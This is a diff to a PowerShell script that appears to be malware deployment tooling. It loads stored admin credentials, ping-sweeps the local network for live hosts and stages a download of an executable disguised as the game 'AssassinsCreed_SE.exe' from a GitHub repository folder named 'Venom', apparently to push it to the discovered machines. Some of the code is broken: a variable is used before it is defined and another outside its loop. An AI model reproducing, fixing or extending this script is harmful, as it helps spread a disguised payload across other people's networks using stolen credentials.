@@ -4,6 +4,7 @@ function random_text {
 
 $logFile = "$env:temp\deployment_log.txt"
 $credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"
+$activeIPsFile = "$env:temp\$path\activeips.txt"
 
 function Log-Message {
     param (
@@ -32,6 +33,7 @@ function Get-ActiveIPs {
             try {
                 if (Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 5 -Quiet) {
                     $activeIPs += $ip
+                    
                 }
             }
             catch {
@@ -40,13 +42,19 @@ function Get-ActiveIPs {
         }
     }
     return $activeIPs
+
 }
 
 $wd = random_text
 $path = "$env:temp\$wd"
-$installerUrl = 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"'
+$installerUrl = '"https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"'
 $targets = Get-ActiveIPs
 $desktoppath = [System.Environment]::GetFolderPath("Desktop")
+
+mkdir $path
+cd $path
+Add-Content -Path $activeIPsFile -Value "$ip`n"
+
 
 # if (-not (Test-Path $installerUrl)) {
 #     Write-Error "installerUrl not found at $installerUrl"
